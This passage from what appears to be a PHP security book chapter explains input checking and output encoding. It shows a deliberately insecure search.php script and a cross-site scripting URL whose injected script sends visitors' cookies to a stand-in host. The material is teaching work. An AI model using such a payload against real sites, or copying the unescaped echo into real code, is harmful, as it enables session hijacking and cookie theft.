# # Checking Input and Encoding Output

Many of the chapters throughout this book have emphasized the importance of security when writing PHP applications. Attacks on Web applications are very common, and if you write a popular application containing security holes, it is only a matter of time before those holes are exploited. Attackers can then use your application to do various nasty things, including (but not limited to):

+   - Gaining access to usernames, passwords, sessions, and cookies
+   - Modifying or deleting data in your database
+   - Altering your Web site content (such as defacing your home page)
+   - Running external applications or manipulating files (such as /etc/passwd) on your Web server
+   - Taking over the entire Web server that hosts your application

Therefore it makes sense to eliminate or prevent security holes in your applications. The vast majority of holes in Web applications are caused by one (or both) of the following:

+   - Not properly checking data fed into the application
+   - Not properly encoding data in the application’s output (typically the displayed Web page)

Here’s a simple example of an insecure PHP script called search.php:

```
<?php
$searchQuery = $_GET['search'];
echo "You searched for: $searchQuery";
// (display search results here)
?>
```

This search engine script reads the user-supplied search text from the search parameter, then redispays the search text in the page (followed by the search results). For example, if the script was called with the URL

```
http://localhost/search.php?search=monkeys
```

the script would display the following:

```
You searched for: monkeys
```

So far so good. However, what if the following URL is passed to the script?

```
http://localhost/search.php?search=%3Cscript%3Edocument.location.href%3D%27ht	tp%3A%2F%2Fwww.example.com%3Fstolencodeokies%3D%27%2Bdocument.cookie%3C/script%3E
```

This URL might be in an email message sent to the visitor from an attacker. If the visitor clicks the link, the script will output the following markup to the browser:

```
You searched for: <script>document.location.href='http://www.example
.com?stolencodeokies=' + document.cookie</script>
```